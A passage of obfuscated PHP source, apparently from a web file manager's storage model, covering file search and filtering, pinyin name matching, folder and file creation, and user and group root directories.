} if (!isset($¿øùåš[$æôõ¬ã‹[32]]) || !is_array($†ä’ÆØ›[$æôõ¬ã‹[476]])) { return; } $¿øùåš[$æôõ¬ã‹[476]] = array($æôõ¬ã‹[7], $†ä’ÆØ›[$æôõ¬ã‹[476]]); unset($¿øùåš[$æôõ¬ã‹[32]]); unset($†ä’ÆØ›[$æôõ¬ã‹[476]]); $±¯ÖŸŸ = $this->field($Ë—ÚÓÂ‘)->where($¿øùåš)->limit($æôõ¬ã‹[2091])->select(); if (!$±¯ÖŸŸ || count($±¯ÖŸŸ) == 0) { return; } $Ç³·úÏå[$æôõ¬ã‹[378]] = array_merge($±¯ÖŸŸ, $Ç³·úÏå[$æôõ¬ã‹[378]]); $Ç³·úÏå[$æôõ¬ã‹[375]][$æôõ¬ã‹[376]] += count($±¯ÖŸŸ); } private function _listSearchTag(&$úà‰¬«Ù, $Ê‹ºÖ´, $›®ğ˜¼Ö) { $Ù«öşİ =& $_SERVER[™¾ÇÙ¯¹]; if (!$Ê‹ºÖ´[$Ù«öşİ[1931]] || $úà‰¬«Ù[$Ù«öşİ[375]][$Ù«öşİ[362]] > 1) { return; } $ƒ£ê²„ñ = Model($Ù«öşİ[2092])->listData(); $ÙÆÆëŞÂ = array(); $Õ¦ƒ¿œ¿ = $Ê‹ºÖ´[$Ù«öşİ[1931]]; foreach ($ƒ£ê²„ñ as $ÖÄÈû) { $½ÚÊç­Â = $ÖÄÈû[$Ù«öşİ[32]]; $úæõÊÚš = str_replace($Ù«öşİ[53], $Ù«öşİ[12], Pinyin::get($½ÚÊç­Â)); if (stripos($½ÚÊç­Â, $Õ¦ƒ¿œ¿) !== !1 || stripos($úæõÊÚš, $Õ¦ƒ¿œ¿) !== !1) { $ÙÆÆëŞÂ[] = $ÖÄÈû[$Ù«öşİ[407]]; } } if (!$ÙÆÆëŞÂ) { return; } $°‘„ÑÚ€ = array($Ù«öşİ[434] => array($Ù«öşİ[7], $ÙÆÆëŞÂ), $Ù«öşİ[1665] => USER_ID); $•Ğã½À» = Model($Ù«öşİ[436])->field($Ù«öşİ[84])->where($°‘„ÑÚ€)->select(); $•Ğã½À» = array_to_keyvalue($•Ğã½À», $Ù«öşİ[12], $Ù«öşİ[84]); $ÁÕíŞÃ = array_unique($•Ğã½À»); $this->_listSearchMerge($úà‰¬«Ù, $Ê‹ºÖ´, $›®ğ˜¼Ö, $ÁÕíŞÃ); } private function _listSearchDesc(&$™‡±ş¹ı, $í«ƒ×‚, $©¡®Ö¥ø) { $Ì’ËÇØ¶ =& $_SERVER[™¾ÇÙ¯¹]; if (!$í«ƒ×‚[$Ì’ËÇØ¶[1931]] || $™‡±ş¹ı[$Ì’ËÇØ¶[375]][$Ì’ËÇØ¶[362]] > 1) { return; } $şèÊ°‰» = array($Ì’ËÇØ¶[94] => $Ì’ËÇØ¶[461], $Ì’ËÇØ¶[383] => array($Ì’ËÇØ¶[391], $Ì’ËÇØ¶[1933] . $í«ƒ×‚[$Ì’ËÇØ¶[1931]] . $Ì’ËÇØ¶[1933])); $¹ûª‡åö = !1; if ($¹ûª‡åö) { $ôŞù¹•ß = $this->listSearchChildren($í«ƒ×‚[$Ì’ËÇØ¶[440]]); $ôŞù¹•ß = array_unique($ôŞù¹•ß); if (!$ôŞù¹•ß) { return; } $şèÊ°‰»[$Ì’ËÇØ¶[410]] = array($Ì’ËÇØ¶[7], $ôŞù¹•ß); } $†ßáÄİß = Model($Ì’ËÇØ¶[577])->field($Ì’ËÇØ¶[410])->where($şèÊ°‰»)->limit(5000)->select(); $§»Œƒ = array_to_keyvalue($†ßáÄİß, $Ì’ËÇØ¶[12], $Ì’ËÇØ¶[410]); $this->_listSearchMerge($™‡±ş¹ı, $í«ƒ×‚, $©¡®Ö¥ø, $§»Œƒ); } private function _listSearchGroupTag(&$­Ñ›ÏÕó, $ŞİãĞˆí, $æØù€éÛ) { $“µÜ»Çı =& $_SERVER[™¾ÇÙ¯¹]; if (!$ŞİãĞˆí[$“µÜ»Çı[1931]] || $­Ñ›ÏÕó[$“µÜ»Çı[375]][$“µÜ»Çı[362]] > 1 || !$ŞİãĞˆí[$“µÜ»Çı[440]]) { return; } $ä›éÄ‹Ï = $this->sourceInfo($ŞİãĞˆí[$“µÜ»Çı[440]]); if (!$ä›éÄ‹Ï || $ä›éÄ‹Ï[$“µÜ»Çı[419]] != SourceModel::TYPE_GROUP) { return; } $®ş¸‚ç° = $ä›éÄ‹Ï[$“µÜ»Çı[513]]; $ù‰Ôë‡ñ = Model($“µÜ»Çı[2093])->get($®ş¸‚ç°); $Â¯ŠÚˆº = array(); $İËğİØË = $ŞİãĞˆí[$“µÜ»Çı[1931]]; foreach ($ù‰Ôë‡ñ[$“µÜ»Çı[378]] as $öä¾£ûÇ) { $İâˆÛü = $öä¾£ûÇ[$“µÜ»Çı[32]]; $³í’ º’ = str_replace($“µÜ»Çı[53], $“µÜ»Çı[12], Pinyin::get($İâˆÛü)); if (stripos($İâˆÛü, $İËğİØË) !== !1 || stripos($³í’ º’, $İËğİØË) !== !1) { $Â¯ŠÚˆº[] = $öä¾£ûÇ[$“µÜ»Çı[407]]; } } if (!$Â¯ŠÚˆº) { return; } $¢¹Å˜§£ = array($“µÜ»Çı[434] => array($“µÜ»Çı[7], $Â¯ŠÚˆº), $“µÜ»Çı[1665] => 0, $“µÜ»Çı[33] => $“µÜ»Çı[1953] . $®ş¸‚ç°); $Ğ»¤µ = Model($“µÜ»Çı[436])->field($“µÜ»Çı[84])->where($¢¹Å˜§£)->select(); $Ğ»¤µ = array_to_keyvalue($Ğ»¤µ, $“µÜ»Çı[12], $“µÜ»Çı[84]); $æ¬ñèƒ» = array_unique($Ğ»¤µ); $this->_listSearchMerge($­Ñ›ÏÕó, $ŞİãĞˆí, $æØù€éÛ, $æ¬ñèƒ»); } private function _listSearchMerge(&$İ²€Êñï, $»ÒÔÄ‡°, $¬§öî‡…, $îÍ³˜“) { $¦éµø =& $_SERVER[™¾ÇÙ¯¹]; if (!$îÍ³˜“) { return; } $ßëôªå€ = array_to_keyvalue($İ²€Êñï[$¦éµø[378]], $¦éµø[12], $¦éµø[410]); $âÔˆæ• = array_diff($îÍ³˜“, $ßëôªå€); if (!$âÔˆæ•) { return; } $ÒéÑµƒ™ = array($¦éµø[410] => array($¦éµø[7], $âÔˆæ•)); $‚‰²º˜ = $this->field($¬§öî‡…)->where($ÒéÑµƒ™)->select(); if (!$‚‰²º˜) { return; } $óíï¦Û = array(); foreach ($‚‰²º˜ as $ÄÅÔÈÈ£) { if ($this->_listSearchFilter($ÄÅÔÈÈ£, $»ÒÔÄ‡°)) { $óíï¦Û[] = $ÄÅÔÈÈ£; } } $İ²€Êñï[$¦éµø[378]] = array_merge($óíï¦Û, $İ²€Êñï[$¦éµø[378]]); $İ²€Êñï[$¦éµø[375]][$¦éµø[376]] += count($óíï¦Û); } private function _listSearchFilter($ìÛĞñÃ, $ÉúÔ£ú) { $·ŠÀìŒ =& $_SERVER[™¾ÇÙ¯¹]; $Êı÷´€˜ = $ìÛĞñÃ[$·ŠÀìŒ[418]] == $·ŠÀìŒ[88]; if (!strstr($ìÛĞñÃ[$·ŠÀìŒ[529]], $·ŠÀìŒ[50] . $ÉúÔ£ú[$·ŠÀìŒ[440]] . $·ŠÀìŒ[50])) { return !1; } if (isset($ÉúÔ£ú[$·ŠÀìŒ[420]]) && $ÉúÔ£ú[$·ŠÀìŒ[420]] != $·ŠÀìŒ[1892]) { if ($ÉúÔ£ú[$·ŠÀìŒ[420]] == $·ŠÀìŒ[75] && !$Êı÷´€˜) { return !1; } if ($ÉúÔ£ú[$·ŠÀìŒ[420]] != $·ŠÀìŒ[75] && $Êı÷´€˜) { return !1; } if (!strstr($ìÛĞñÃ[$·ŠÀìŒ[174]], $·ŠÀìŒ[50] . $ÉúÔ£ú[$·ŠÀìŒ[420]] . $·ŠÀìŒ[50])) { return !1; } } if (isset($ÉúÔ£ú[$·ŠÀìŒ[2094]]) && $ÉúÔ£ú[$·ŠÀìŒ[2094]] < $ìÛĞñÃ[$·ŠÀìŒ[76]]) { return !1; } if (isset($ÉúÔ£ú[$·ŠÀìŒ[2095]]) && $ÉúÔ£ú[$·ŠÀìŒ[2095]] > $ìÛĞñÃ[$·ŠÀìŒ[76]]) { return !1; } if (isset($ÉúÔ£ú[$·ŠÀìŒ[608]]) && $ÉúÔ£ú[$·ŠÀìŒ[608]] != $ìÛĞñÃ[$·ŠÀìŒ[464]]) { return !1; } return !0; } public function listSearchChildren($‘áì®¹“, $—ì’œ = 5000) { $ˆÙÇú¶ë =& $_SERVER[™¾ÇÙ¯¹]; $ÒŞ´†ª˜ = array(); $›ÊÉ¯çµ = $this->sourceInfo($‘áì®¹“); $™Èëà†É = array($ˆÙÇú¶ë[529] => array($ˆÙÇú¶ë[391], $›ÊÉ¯çµ[$ˆÙÇú¶ë[529]] . $›ÊÉ¯çµ[$ˆÙÇú¶ë[410]] . $ˆÙÇú¶ë[559])); $Æ…òì‰ = $this->field($ˆÙÇú¶ë[76])->where($™Èëà†É)->limit($—ì’œ + 1)->select(); $Õø‡– = is_array($Æ…òì‰) ? count($Æ…òì‰) : 0; if ($Õø‡– > $—ì’œ) { return $this->_listSearchChildrenNear($‘áì®¹“, $—ì’œ); } $èòÎÁê‹ = $this->field($ˆÙÇú¶ë[410])->where($™Èëà†É)->select(); $ÒŞ´†ª˜ = array_to_keyvalue($èòÎÁê‹, $ˆÙÇú¶ë[12], $ˆÙÇú¶ë[410]); return $ÒŞ´†ª˜; } private function _listSearchChildrenNear($ìÓ°Øñ¡, $¬êŸÇ¼Ş) { $©øßãàÙ =& $_SERVER[™¾ÇÙ¯¹]; $—Îûƒ¾ = array(); $ìü«ˆğÑ = array($©øßãàÙ[440] => $ìÓ°Øñ¡); $‘šáë½½ = $this->field($©øßãàÙ[2096])->where($ìü«ˆğÑ)->select(); $Ò¾½·¯¨ = array_to_keyvalue(array_filter_by_field($‘šáë½½, $©øßãàÙ[418], $©øßãàÙ[88]), $©øßãàÙ[12], $©øßãàÙ[410]); $—Îûƒ¾ = array_merge($—Îûƒ¾, array_to_keyvalue($‘šáë½½, $©øßãàÙ[12], $©øßãàÙ[410])); if (!$Ò¾½·¯¨) { return $—Îûƒ¾; } $ìü«ˆğÑ = array($©øßãàÙ[440] => array($©øßãàÙ[7], $Ò¾½·¯¨)); $‘šáë½½ = $this->field($©øßãàÙ[2096])->where($ìü«ˆğÑ)->limit($¬êŸÇ¼Ş)->select(); $—Îûƒ¾ = array_merge($—Îûƒ¾, array_to_keyvalue($‘šáë½½, $©øßãàÙ[12], $©øßãàÙ[410])); $—Îûƒ¾ = array_slice($—Îûƒ¾, 0, $¬êŸÇ¼Ş); return $—Îûƒ¾; } private function _listSearchBindPinyin($ˆ§Û†¯†, &$­É…‰Äá, &$õˆ„ø³´) { $À°…ÌÍÖ =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($ˆ§Û†¯†[$À°…ÌÍÖ[1931]]) || !$ˆ§Û†¯†[$À°…ÌÍÖ[1931]]) { return; } if (!Input::check($ˆ§Û†¯†[$À°…ÌÍÖ[1931]], $À°…ÌÍÖ[327]) || strlen($ˆ§Û†¯†[$À°…ÌÍÖ[1931]]) < 2) { return; } $üÆ­œÃƒ = "\114\x45\106\124\40\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\157\137\163\x6f\x75\x72\x63\x65\x5f\155\x65\x74\x61\40\x6d\x65\164\x61\x20\157\156\x20\x73\x6f\x75\162\143\x65\x2e\x73\x6f\x75\x72\143\145\111\104\40\75\x20\x6d\x65\164\141\56\x73\x6f\165\x72\x63\145\111\104"; $¸¶âŸ¾ = array(); $õˆ„ø³´ = str_replace(array($À°…ÌÍÖ[231], $À°…ÌÍÖ[53], $À°…ÌÍÖ[2097]), $À°…ÌÍÖ[12], $õˆ„ø³´); $õˆ„ø³´ = $À°…ÌÍÖ[446] . str_replace($À°…ÌÍÖ[50], $À°…ÌÍÖ[447], $õˆ„ø³´); $˜‚æÚ× = $­É…‰Äá[$À°…ÌÍÖ[32]]; unset($­É…‰Äá[$À°…ÌÍÖ[32]]); foreach ($­É…‰Äá as $¾ñ¹¿àŒ => $úÓÙ£®ó) { $¸¶âŸ¾[$À°…ÌÍÖ[446] . $¾ñ¹¿àŒ] = $úÓÙ£®ó; } foreach ($˜‚æÚ× as $¨ğõ…·±) { $¸¶âŸ¾[] = array($À°…ÌÍÖ[451] => $¨ğõ…·±, $À°…ÌÍÖ[1008] => $À°…ÌÍÖ[1935], array($À°…ÌÍÖ[2098] => $¨ğõ…·±, $À°…ÌÍÖ[2099] => array($À°…ÌÍÖ[7], array($À°…ÌÍÖ[473], $À°…ÌÍÖ[472])))); } $this->join($üÆ­œÃƒ); $­É…‰Äá = $¸¶âŸ¾; } private function _parseSearchWhere($­ïÊ¶Ò‘) { $¬ã—¬Œ“ =& $_SERVER[™¾ÇÙ¯¹]; $°“É™ = array(); if (isset($­ïÊ¶Ò‘[$¬ã—¬Œ“[776]]) && $­ïÊ¶Ò‘[$¬ã—¬Œ“[776]]) { $°“É™[$¬ã—¬Œ“[85]] = array($¬ã—¬Œ“[2100], $­ïÊ¶Ò‘[$¬ã—¬Œ“[776]]); } if (isset($­ïÊ¶Ò‘[$¬ã—¬Œ“[505]]) && $­ïÊ¶Ò‘[$¬ã—¬Œ“[505]]) { $£Ç§­Òú = array($¬ã—¬Œ“[2101], $­ïÊ¶Ò‘[$¬ã—¬Œ“[505]]); if ($°“É™[$¬ã—¬Œ“[85]]) { $°“É™[$¬ã—¬Œ“[85]] = array($°“É™[$¬ã—¬Œ“[85]], $£Ç§­Òú, $¬ã—¬Œ“[2102]); } else { $°“É™[$¬ã—¬Œ“[85]] = $£Ç§­Òú; } } if (isset($­ïÊ¶Ò‘[$¬ã—¬Œ“[2094]]) && $­ïÊ¶Ò‘[$¬ã—¬Œ“[2094]] > 0) { $°“É™[$¬ã—¬Œ“[76]] = array($¬ã—¬Œ“[2100], $­ïÊ¶Ò‘[$¬ã—¬Œ“[2094]]); } if (isset($­ïÊ¶Ò‘[$¬ã—¬Œ“[2095]]) && $­ïÊ¶Ò‘[$¬ã—¬Œ“[2095]]) { $£Ç§­Òú = array($¬ã—¬Œ“[2101], $­ïÊ¶Ò‘[$¬ã—¬Œ“[2095]]); if ($°“É™[$¬ã—¬Œ“[76]]) { $°“É™[$¬ã—¬Œ“[76]] = array($°“É™[$¬ã—¬Œ“[76]], $£Ç§­Òú, $¬ã—¬Œ“[2102]); } else { $°“É™[$¬ã—¬Œ“[76]] = $£Ç§­Òú; } } if (isset($­ïÊ¶Ò‘[$¬ã—¬Œ“[608]]) && $­ïÊ¶Ò‘[$¬ã—¬Œ“[608]]) { $°“É™[] = array($¬ã—¬Œ“[464] => $­ïÊ¶Ò‘[$¬ã—¬Œ“[608]], $¬ã—¬Œ“[462] => $­ïÊ¶Ò‘[$¬ã—¬Œ“[608]], $¬ã—¬Œ“[1008] => $¬ã—¬Œ“[1935]); } if (isset($­ïÊ¶Ò‘[$¬ã—¬Œ“[420]]) && $­ïÊ¶Ò‘[$¬ã—¬Œ“[420]]) { $Êû§¹ñÅ = $­ïÊ¶Ò‘[$¬ã—¬Œ“[420]]; if ($Êû§¹ñÅ == $¬ã—¬Œ“[75]) { $°“É™[$¬ã—¬Œ“[418]] = 1; } else { if ($Êû§¹ñÅ == $¬ã—¬Œ“[2103]) { $°“É™[$¬ã—¬Œ“[418]] = 0; } else { if ($Êû§¹ñÅ) { $Êû§¹ñÅ = is_array($Êû§¹ñÅ) ? $Êû§¹ñÅ : explode($¬ã—¬Œ“[50], $Êû§¹ñÅ); $°“É™[$¬ã—¬Œ“[420]] = array($¬ã—¬Œ“[426], $Êû§¹ñÅ); $°“É™[$¬ã—¬Œ“[418]] = 0; } } } } $this->_parseSearchParent($­ïÊ¶Ò‘, $°“É™); if (isset($­ïÊ¶Ò‘[$¬ã—¬Œ“[1931]]) && trim($­ïÊ¶Ò‘[$¬ã—¬Œ“[1931]])) { $—úí¢¿ = trim($­ïÊ¶Ò‘[$¬ã—¬Œ“[1931]]); $ŒºÛœì… = explode($¬ã—¬Œ“[53], $—úí¢¿); if (strlen($—úí¢¿) > 2 && (substr($—úí¢¿, 0, 1) == $¬ã—¬Œ“[118] && substr($—úí¢¿, -1) == $¬ã—¬Œ“[118]) || substr($—úí¢¿, 0, 1) == $¬ã—¬Œ“[58] && substr($—úí¢¿, -1) == $¬ã—¬Œ“[58]) { $—úí¢¿ = substr($—úí¢¿, 1, -1); $ŒºÛœì… = array($—úí¢¿); } $°“É™[$¬ã—¬Œ“[32]] = array(array($¬ã—¬Œ“[558], $¬ã—¬Œ“[1933] . $—úí¢¿ . $¬ã—¬Œ“[1933])); if (count($ŒºÛœì…) > 1) { $°“É™[$¬ã—¬Œ“[32]] = array(); foreach ($ŒºÛœì… as $À¯½à¢­) { if (!trim($À¯½à¢­)) { continue; } $°“É™[$¬ã—¬Œ“[32]][] = array($¬ã—¬Œ“[558], $¬ã—¬Œ“[1933] . trim($À¯½à¢­) . $¬ã—¬Œ“[1933]); } } } return $°“É™; } private function _parseSearchParent($ëÔ†Õİ¹, &$²²äæ²Š) { $ˆ¥÷€ ¼ =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($ëÔ†Õİ¹[$ˆ¥÷€ ¼[440]]) || !$ëÔ†Õİ¹[$ˆ¥÷€ ¼[440]]) { return; } $·Ü¾ÆÆ° = $this->pathInfo($ëÔ†Õİ¹[$ˆ¥÷€ ¼[440]]); $ô×÷¹Ğ = $·Ü¾ÆÆ°[$ˆ¥÷€ ¼[440]] . $ˆ¥÷€ ¼[12] === $ˆ¥÷€ ¼[197]; $·‚›¡»Ç = $·Ü¾ÆÆ°[$ˆ¥÷€ ¼[419]] == $ˆ¥÷€ ¼[523]; if ($·Ü¾ÆÆ°[$ˆ¥÷€ ¼[540]] == $ˆ¥÷€ ¼[541]) { $êä¯«” = $this->sourceInfo($ëÔ†Õİ¹[$ˆ¥÷€ ¼[440]]); $·Ü¾ÆÆ°[$ˆ¥÷€ ¼[529]] = $êä¯«”[$ˆ¥÷€ ¼[529]]; } $²²äæ²Š[$ˆ¥÷€ ¼[598]] = array($ˆ¥÷€ ¼[558], $·Ü¾ÆÆ°[$ˆ¥÷€ ¼[529]] . $ëÔ†Õİ¹[$ˆ¥÷€ ¼[440]] . $ˆ¥÷€ ¼[559]); $üûîãÄ = isset($ëÔ†Õİ¹[$ˆ¥÷€ ¼[1796]]) && in_array($ˆ¥÷€ ¼[523], $ëÔ†Õİ¹[$ˆ¥÷€ ¼[1796]]); if (!$üûîãÄ || !$·‚›¡»Ç || !$ô×÷¹Ğ || !$·Ü¾ÆÆ°[$ˆ¥÷€ ¼[421]]) { return; } if (!AuthModel::authCheckRoot($·Ü¾ÆÆ°[$ˆ¥÷€ ¼[421]][$ˆ¥÷€ ¼[422]])) { return; } $·Ì¾ÎŒ = $·Ü¾ÆÆ°[$ˆ¥÷€ ¼[513]] . $ˆ¥÷€ ¼[12]; if ($·Ì¾ÎŒ == $ˆ¥÷€ ¼[88]) { unset($²²äæ²Š[$ˆ¥÷€ ¼[598]]); $²²äæ²Š[$ˆ¥÷€ ¼[419]] = self::TYPE_GROUP; return; } $†ÖÌˆ€â = Model($ˆ¥÷€ ¼[530])->groupChildrenAll($·Ì¾ÎŒ); $«••ó¡‰ = count($†ÖÌˆ€â); if ($«••ó¡‰ <= 1) { return; } $„“õİ‡· = array($ˆ¥÷€ ¼[440] => 0, $ˆ¥÷€ ¼[419] => self::TYPE_GROUP, $ˆ¥÷€ ¼[513] => array($ˆ¥÷€ ¼[7], $†ÖÌˆ€â)); $Ş¥Øìàë = $this->field($ˆ¥÷€ ¼[2104])->where($„“õİ‡·)->limit($«••ó¡‰)->select(); $²²äæ²Š[$ˆ¥÷€ ¼[598]] = array(); foreach ($Ş¥Øìàë as $“è„¿›) { $²²äæ²Š[$ˆ¥÷€ ¼[598]][] = array($ˆ¥÷€ ¼[558], $ˆ¥÷€ ¼[539] . $“è„¿›[$ˆ¥÷€ ¼[410]] . $ˆ¥÷€ ¼[559]); } $²²äæ²Š[$ˆ¥÷€ ¼[598]][] = $ˆ¥÷€ ¼[1935]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($²ö§ŸÇ£) { $ûÃÈ©ß =& $_SERVER[™¾ÇÙ¯¹]; $ß­—ªÂí = Model($ûÃÈ©ß[521])->where(array($ûÃÈ©ß[1656] => $²ö§ŸÇ£))->find(); $„‡Æ°³  = $this->_mkdirRoot(SourceModel::TYPE_USER, $²ö§ŸÇ£, $ß­—ªÂí[$ûÃÈ©ß[32]]); $this->userDesktopAdd($„‡Æ°³ ); return $„‡Æ°³ ; } public function userDesktopAdd($·—ğŞ“¼) { $º…÷»å™ =& $_SERVER[™¾ÇÙ¯¹]; $‚å°ÚŠ§ = LNG($º…÷»å™[2105]); $¨é•¹Ú™ = $this->mkdir($·—ğŞ“¼, $‚å°ÚŠ§); $this->metaSet($¨é•¹Ú™, $º…÷»å™[2106], $º…÷»å™[88]); $this->metaSet($·—ğŞ“¼, $º…÷»å™[2107], $¨é•¹Ú™); } public function userPathSafeAdd($Š¢ë¤Ì«) { $£”ß¡ =& $_SERVER[™¾ÇÙ¯¹]; $î­ “ëÒ = Model($£”ß¡[521])->getInfoFull($Š¢ë¤Ì«); if (!$î­ “ëÒ) { return !1; } if (_get($î­ “ëÒ, $£”ß¡[544])) { return $î­ “ëÒ[$£”ß¡[474]][$£”ß¡[2108]]; } $‡î£¼¿ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Š¢ë¤Ì«, $£”ß¡[2109], $£”ß¡[441]); Model($£”ß¡[521])->metaSet($Š¢ë¤Ì«, $£”ß¡[2108], $‡î£¼¿); $this->metaSet($‡î£¼¿, $£”ß¡[2110], $Š¢ë¤Ì«); return $‡î£¼¿; } public function groupRootAdd($å Ø¾§†) { $Ó©èˆÉó =& $_SERVER[™¾ÇÙ¯¹]; $°¿™ÖÜ = Model($Ó©èˆÉó[530])->where(array($Ó©èˆÉó[1925] => $å Ø¾§†))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $å Ø¾§†, $°¿™ÖÜ[$Ó©èˆÉó[32]]); } public function systemRootPathAdd($ï‘É–Õ±) { if ($ï‘É–Õ± != $_SERVER[™¾ÇÙ¯¹][552]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ï‘É–Õ±); } public function userRootRemove($˜Õ’û€±) { $ƒ˜ÑûĞç = $this->sourceRoot(SourceModel::TYPE_USER, $˜Õ’û€±, !0); foreach ($ƒ˜ÑûĞç as $ãêÁËõù) { if (!$ãêÁËõù) { continue; } $this->remove($ãêÁËõù[$_SERVER[™¾ÇÙ¯¹][410]], !1); } } public function groupRootRemove($ÊÃö ¶¡) { $¢‰øöƒÅ = $this->sourceRoot(SourceModel::TYPE_GROUP, $ÊÃö ¶¡); if (!$¢‰øöƒÅ) { return; } $this->remove($¢‰øöƒÅ[$_SERVER[™¾ÇÙ¯¹][410]], !1); } private function _mkdirRoot($îôéØô, $ö¾öäøû, $ˆ¾€‹ËÑ, $©‡¬À´‘ = '') { $–óŸäÉ˜ =& $_SERVER[™¾ÇÙ¯¹]; $íÛ£“á = array($–óŸäÉ˜[409] => 0, $–óŸäÉ˜[594] => $îôéØô, $–óŸäÉ˜[595] => $ö¾öäøû, $–óŸäÉ˜[591] => 1, $–óŸäÉ˜[596] => USER_ID, $–óŸäÉ˜[597] => USER_ID, $–óŸäÉ˜[592] => $©‡¬À´‘, $–óŸäÉ˜[598] => $–óŸäÉ˜[539], $–óŸäÉ˜[438] => 0, $–óŸäÉ˜[593] => 0, $–óŸäÉ˜[477] => 0, $–óŸäÉ˜[599] => $–óŸäÉ˜[12]); if ($©ûµóíş = $this->where($íÛ£“á)->find()) { return $©ûµóíş[$–óŸäÉ˜[410]]; } $ì¶î ¸ = "\115\157\144\x65\154\x53\157\165\x72\143\145\56\x6d\153\x64\151\x72\x52\x6f\x6f\x74\x2e{$îôéØô}\x2e{$ö¾öäøû}\x2e" . $ˆ¾€‹ËÑ; CacheLock::lock($ì¶î ¸); $íÛ£“á[$–óŸäÉ˜[32]] = $ˆ¾€‹ËÑ; $õÖÆ¢‰ = $this->add($íÛ£“á); $…úÔº®ˆ = array($–óŸäÉ˜[600] => short_id($õÖÆ¢‰)); $this->where(array($–óŸäÉ˜[425] => $õÖÆ¢‰))->save($…úÔº®ˆ); CacheLock::unlock($ì¶î ¸); return $õÖÆ¢‰; } private function sourceRoot($ªòÅˆ Ú, $œš’€¾©, $°æşšó = false) { $şş§äş¤ =& $_SERVER[™¾ÇÙ¯¹]; $²’ìí€ù = array($şş§äş¤[409] => 0, $şş§äş¤[594] => $ªòÅˆ Ú, $şş§äş¤[595] => $œš’€¾©); if ($°æşšó) { $ê®ßÅòÇ = $this->where($²’ìí€ù)->select(); return $ê®ßÅòÇ ? $ê®ßÅòÇ : array(); } $ìóâî¢ó = $this->where($²’ìí€ù)->find(); return $ìóâî¢ó ? $ìóâî¢ó : array(); } public function sourceRootGroup($¾°Áäò«) { $äÄÔêíë =& $_SERVER[™¾ÇÙ¯¹]; if (is_string($¾°Áäò«)) { $¾°Áäò« = array($¾°Áäò«); } $“ş»¿æ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¾°Áäò«, $äÄÔêíë[188]); $Ã’‰š¨¡ = array($äÄÔêíë[378] => $“ş»¿æ, $äÄÔêíë[375] => array($äÄÔêíë[774] => count($¾°Áäò«))); $this->_listDataApply($Ã’‰š¨¡[$äÄÔêíë[378]]); $this->_listMake($Ã’‰š¨¡); return array_to_keyvalue($Ã’‰š¨¡[$äÄÔêíë[82]], $äÄÔêíë[513]); } public function mkfile($÷³Ü±½¸, $®ÜÑÖÀú, $Ì‹±Ú£¶ = '', $óÀºÂøœ = REPEAT_RENAME) { $÷ïéôŸ =& $_SERVER[™¾ÇÙ¯¹]; $Ó×™ú©ı = Model($÷ïéôŸ[617])->addFileByContent($Ì‹±Ú£¶, $®ÜÑÖÀú); return $this->_createFileCall($÷³Ü±½¸, $®ÜÑÖÀú, $Ó×™ú©ı, $óÀºÂøœ, $÷ïéôŸ[1346]); } public function addFile($íóşœ²Ö, $ç»ÖËÔ¹, $¦Í‰ÍÌ³, $Ì‹ˆÓŞè = false, $¨ï’Ü¡‘ = REPEAT_RENAME) { $˜‰ŞÃºÈ = Model($_SERVER[™¾ÇÙ¯¹][617])->addFile($ç»ÖËÔ¹, $¦Í‰ÍÌ³, $Ì‹ˆÓŞè); return $this->_createFileCall($íóşœ²Ö, $¦Í‰ÍÌ³, $˜‰ŞÃºÈ, $¨ï’Ü¡‘); } public function addFileByFileID($©œ÷·ù§, $±÷¨˜Ê, $çËô²‚, $®…±»’Ï = REPEAT_RENAME) { $ÏŠ¢ÂÍÔ =& $_SERVER[™¾ÇÙ¯¹]; $™àÂ­ÚÛ = Model($ÏŠ¢ÂÍÔ[617])->find($±÷¨˜Ê); Model($ÏŠ¢ÂÍÔ[617])->linkAdd($±÷¨˜Ê); return $this->_createFileCall($©œ÷·ù§, $çËô²‚, $™àÂ­ÚÛ, $®…±»’Ï); } public function addFileByRemote($ĞÊÏÍ©ğ, $¸È§·Øå, $¡ŠÙ€İ‰, $¦Á­Ê¬º = array(), $™ôƒÔèì = REPEAT_RENAME) { $Ç÷ÌÏÎ‚ = Model($_SERVER[™¾ÇÙ¯¹][617])->addFileByRemote($¸È§·Øå, $¡ŠÙ€İ‰, $¦Á­Ê¬º); return $this->_createFileCall($ĞÊÏÍ©ğ, $¡ŠÙ€İ‰, $Ç÷ÌÏÎ‚, $™ôƒÔèì); } private function _createFileCall($Çí»Íú, $ÖõÈî”³, $ñšÒÚš, $ÎØœ¼ÍÆ, $ Âéš€Ç = "\165\160\x6c\157\x61\144") { $ÅÈ÷§Ç =& $_SERVER[™¾ÇÙ¯¹]; $¾†õÎ Å = !1; $this->setMasterDB(); $this->lockWriteStart($Çí»Íú, $ÖõÈî”³); $©ê´ã° = $this->fileNameExist($Çí»Íú, $ÖõÈî”³); $ü’òİªì = $this->_createFile($Çí»Íú, $ÖõÈî”³, $ñšÒÚš, $ÎØœ¼ÍÆ, $¾†õÎ Å); if (!$¾†õÎ Å) { Model($ÅÈ÷§Ç[479])->remove($ñšÒÚš[$ÅÈ÷§Ç[476]]); } if ($¾†õÎ Å && $ü’òİªì && $ü’òİªì != $©ê´ã°) { Model($ÅÈ÷§Ç[2078])->eventCreate($ü’òİªì, $ Âéš€Ç); } $this->lockWriteEnd($Çí»Íú, $ÖõÈî”³); return $ü’òİªì; } public function mkdir($ºÈµçÂ, $†êÛâÎğ, $­› ±Ú = REPEAT_SKIP) { $ïí³…áß =& $_SERVER[™¾ÇÙ¯¹]; $this->setMasterDB(); $¸÷‰˜¸Õ = $this->sourceInfo($ºÈµçÂ); if (!$¸÷‰˜¸Õ) { return !1; } $this->lockWriteStart($ºÈµçÂ, $†êÛâÎğ); if ($­› ±Ú !== !1) { $–ƒ¢îà = $this->fileNameExist($ºÈµçÂ, $†êÛâÎğ); if ($–ƒ¢îà && $­› ±Ú != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ºÈµçÂ, $†êÛâÎğ); return $–ƒ¢îà; } $†êÛâÎğ = $this->fileNameAuto($ºÈµçÂ, $†êÛâÎğ, $­› ±Ú); } $¤¹­Š·ô = array($ïí³…áß[591] => 1, $ïí³…áß[428] => $†êÛâÎğ, $ïí³…áß[592] => $ïí³…áß[12], $ïí³…áß[477] => 0, $ïí³…áß[593] => 0); 